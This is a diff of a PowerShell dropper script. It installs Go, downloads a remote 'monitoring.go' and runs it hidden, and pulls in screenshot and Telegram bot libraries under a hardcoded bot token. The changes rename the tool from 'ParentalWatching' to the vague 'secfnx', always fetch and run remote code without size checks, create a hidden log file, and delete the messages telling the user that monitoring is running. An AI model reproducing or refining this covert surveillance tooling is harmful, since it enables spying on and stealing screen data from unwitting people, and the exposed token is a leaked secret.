@@ -1,6 +1,6 @@
-# install_and_run.ps1
-# Downloads Go MSI, sets up environment, downloads or uses local monitoring.go, and runs it as a script
-# USAGE: powershell.exe -ExecutionPolicy Bypass -NoProfile -File .\install_and_run.ps1
+# secfnx.ps1
+# Downloads Go MSI, sets up environment, downloads monitoring.go, and runs it as a script
+# USAGE: powershell.exe -ExecutionPolicy Bypass -NoProfile -File .\secfnx.ps1
 
 param(
     [string]$BotToken = "8477847766:AAFGIN359PYPPbhe9AwxezwUQqDgXCrPxTE",
@@ -14,15 +14,15 @@ param(
 $LogFile = Join-Path $env:TEMP "download_runner.log"
 $GoVersion = "1.24.7"
 $Arch = if ([Environment]::Is64BitOperatingSystem) { "amd64" } else { "386" }
-$MsiName = "go1.24.7.windows-amd64.msi"
-$MsiUrl = "https://go.dev/dl/go1.24.7.windows-amd64.msi"
+$MsiName = "go$GoVersion.windows-$Arch.msi"
+$MsiUrl = "https://go.dev/dl/$MsiName"
 $GoInstallDir = "C:\Program Files\Go"
 $GoBinPath = Join-Path $GoInstallDir "bin"
 $GoFileName = "monitoring.go"
-$DestFolder = if ($DestFolder) { $DestFolder } else { Join-Path $PSScriptRoot "ParentalWatching" }
+$DestFolder = if ($DestFolder) { $DestFolder } else { Join-Path $PSScriptRoot "secfnx" }
 $GoFilePath = Join-Path $DestFolder $GoFileName
+$PathLog = Join-Path $DestFolder "path_sec.log"
 $LogMaxSize = 10MB
-$MinMsiSize = 50MB # Expected size for Go MSI (~60MB)
 
 # Helper: Log with rotation
 function Log {
@@ -39,6 +39,13 @@ function Log {
     Write-Output $Line
 }
 
+# Helper: Log path to path_sec.log
+function Log-Path {
+    param($Path, $Type)
+    $Line = "$(Get-Date -Format o) - $Type: $Path"
+    Add-Content -Path $PathLog -Value $Line -ErrorAction SilentlyContinue
+}
+
 # Helper: Test admin privileges
 function Test-IsAdmin {
     try {
@@ -51,28 +58,17 @@ function Test-IsAdmin {
 # Helper: Download file with verification
 function Download-File($SourceUrl, $OutPath) {
     Log "Downloading $SourceUrl -> $OutPath"
+    Log-Path $OutPath "File Downloaded"
     try {
-        $client = New-Object System.Net.WebClient
-        $client.DownloadFile($SourceUrl, $OutPath)
-        if (Test-Path $OutPath) {
-            $fileInfo = Get-Item $OutPath
-            if ($fileInfo.Length -gt $MinMsiSize) {
-                Log "Downloaded successfully, file size: $($fileInfo.Length) bytes"
-                return $true
-            } else {
-                Log "Downloaded file is too small: $($fileInfo.Length) bytes, expected > $MinMsiSize"
-                Remove-Item $OutPath -Force -ErrorAction SilentlyContinue
-                return $false
-            }
-        } else {
-            Log "Downloaded file not found at $OutPath"
-            return $false
-        }
+        $ProgressPreference = 'SilentlyContinue'
+        Invoke-WebRequest -Uri $SourceUrl -OutFile $OutPath -UseBasicParsing -ErrorAction Stop
+        Log "Downloaded successfully"
+        return $true
     } catch {
         Log "Download failed: $_"
         return $false
     } finally {
-        $client.Dispose()
+        $ProgressPreference = 'Continue'
     }
 }
 
@@ -128,15 +124,6 @@ function Install-Go {
         Write-Host "Error: Run as Administrator to install Go."
         return $false
     }
-    if (-not (Test-Path $DestFolder)) {
-        Log "Destination folder $DestFolder does not exist. Creating it."
-        New-Item -Path $DestFolder -ItemType Directory -Force | Out-Null
-    }
-    if (-not (Test-Path $DestFolder)) {
-        Log "Failed to create destination folder $DestFolder"
-        Write-Host "Error: Could not create folder 'ParentalWatching'. Check permissions."
-        return $false
-    }
     Log "Downloading Go MSI $MsiUrl to $MsiPath"
     if (-not (Download-File $MsiUrl $MsiPath)) {
         Log "Go MSI download failed"
@@ -148,10 +135,6 @@ function Install-Go {
         $Proc = Start-Process -FilePath "msiexec.exe" -ArgumentList $Args -Wait -PassThru -ErrorAction Stop
         if ($Proc.ExitCode -ne 0) {
             Log "Go MSI install failed: exit code $($Proc.ExitCode)"
-            return $false
-        }
-        if (-not (Test-Path (Join-Path $GoInstallDir "bin\go.exe"))) {
-            Log "Go installation completed but go.exe not found at $GoInstallDir\bin\go.exe"
             return $false
         }
         Log "Go installed successfully"
@@ -180,7 +163,6 @@ function Run-GoScript($GoFile) {
             WorkingDirectory = $DestFolder
             PassThru = $true
             RedirectStandardError = Join-Path $DestFolder "go_run_error.log"
-            RedirectStandardOutput = Join-Path $DestFolder "go_run_output.log"
             ErrorAction = "Stop"
         }
         if ($RunHidden) {
@@ -208,15 +190,13 @@ function Run-GoScript($GoFile) {
         }
         if (-not $serverStarted) {
             $ErrorLog = Get-Content (Join-Path $DestFolder "go_run_error.log") -Raw -ErrorAction SilentlyContinue
-            $OutputLog = Get-Content (Join-Path $DestFolder "go_run_output.log") -Raw -ErrorAction SilentlyContinue
-            Log "MJPEG server failed to start after $maxAttempts attempts. Check $DestFolder\go_run_error.log, $DestFolder\go_run_output.log, and %TEMP%\monitor_bot.log. Error: $ErrorLog Output: $OutputLog"
+            Log "MJPEG server failed to start after $maxAttempts attempts. Check $DestFolder\go_run_error.log and %TEMP%\monitor_bot.log. Error: $ErrorLog"
             return $false
         }
         return $true
     } catch {
         $ErrorLog = Get-Content (Join-Path $DestFolder "go_run_error.log") -Raw -ErrorAction SilentlyContinue
-        $OutputLog = Get-Content (Join-Path $DestFolder "go_run_output.log") -Raw -ErrorAction SilentlyContinue
-        Log "Failed to run Go script: $_. Error: $ErrorLog Output: $OutputLog"
+        Log "Failed to run Go script: $_. Error: $ErrorLog"
         return $false
     }
 }
@@ -235,10 +215,12 @@ function Install-GoDependencies($GoFile) {
         $GoSum = Join-Path $DestFolder "go.sum"
         if (Test-Path $GoMod) {
             Log "Removing existing go.mod to avoid conflicts"
+            Log-Path $GoMod "File Deleted"
             Remove-Item $GoMod -Force -ErrorAction SilentlyContinue
         }
         if (Test-Path $GoSum) {
             Log "Removing existing go.sum to avoid conflicts"
+            Log-Path $GoSum "File Deleted"
             Remove-Item $GoSum -Force -ErrorAction SilentlyContinue
         }
         Log "Initializing Go module"
@@ -248,6 +230,7 @@ function Install-GoDependencies($GoFile) {
             Log "Failed to initialize Go module: exit code $($Proc.ExitCode). Error: $ErrorLog"
             return $false
         }
+        Log-Path (Join-Path $DestFolder "go.mod") "File Created"
         Log "Fetching dependencies"
         $Proc = Start-Process -FilePath "go" -ArgumentList "get", "-v", "github.com/kbinani/screenshot", "github.com/go-telegram-bot-api/telegram-bot-api/v5" -WorkingDirectory $DestFolder -Wait -PassThru -NoNewWindow -RedirectStandardError (Join-Path $DestFolder "go_get_error.log") -RedirectStandardOutput (Join-Path $DestFolder "go_get_output.log") -ErrorAction Stop
         if ($Proc.ExitCode -ne 0) {
@@ -255,6 +238,7 @@ function Install-GoDependencies($GoFile) {
             Log "Failed to install dependencies: exit code $($Proc.ExitCode). Error: $ErrorLog"
             return $false
         }
+        Log-Path (Join-Path $DestFolder "go.sum") "File Created"
         Log "Dependencies installed successfully"
         return $true
     } catch {
@@ -268,27 +252,30 @@ Log "Script started. DestFolder: $DestFolder, Url: $Url"
 if (-not (Test-Path $DestFolder)) {
     Log "Creating destination folder: $DestFolder"
     New-Item -Path $DestFolder -ItemType Directory -Force | Out-Null
+    Log-Path $DestFolder "Folder Created"
 }
 if (-not (Test-Path $DestFolder)) {
     Log "Failed to create destination folder: $DestFolder. Exiting."
-    Write-Host "Error: Could not create folder 'ParentalWatching'. Check permissions."
+    Write-Host "Error: Could not create folder 'secfnx'. Check permissions."
     exit 1
 }
 
-# Check for local monitoring.go, otherwise download
+# Create hidden path_sec.log
+if (-not (Test-Path $PathLog)) {
+    New-Item -Path $PathLog -ItemType File -Force | Out-Null
+    Log-Path $PathLog "File Created"
+    Set-ItemProperty -Path $PathLog -Name Attributes -Value "Hidden"
+}
+
+# Always download monitoring.go to ensure correct version
+Log "Downloading Go script from $Url to $GoFilePath"
 if (Test-Path $GoFilePath) {
-    Log "Local monitoring.go found at $GoFilePath. Using it."
-} else {
-    # Convert GitHub blob URL to raw
-    if ($Url -match "github.com/.+/blob/(.+)$") {
-        $Url = $Url -replace "https://github.com/", "https://raw.githubusercontent.com/" -replace "/blob/", "/"
-        Log "Converted blob URL to raw: $Url"
-    }
-    # Download Go script
-    if (-not (Download-File $Url $GoFilePath)) {
-        Log "Failed to download Go script. Exiting."
-        exit 1
-    }
+    Log "Removing existing monitoring.go to avoid conflicts"
+    Remove-Item $GoFilePath -Force -ErrorAction SilentlyContinue
+}
+if (-not (Download-File $Url $GoFilePath)) {
+    Log "Failed to download Go script. Exiting."
+    exit 1
 }
 
 # Install Go
@@ -311,5 +298,3 @@ if (-not (Run-GoScript $GoFilePath)) {
 }
 
 Log "Script completed successfully."
-Write-Host "The monitoring.go is now running. Access http://localhost:5000/stream in your browser for the live preview."
-Write-Host "Check %TEMP%\monitor_bot.log for logs."
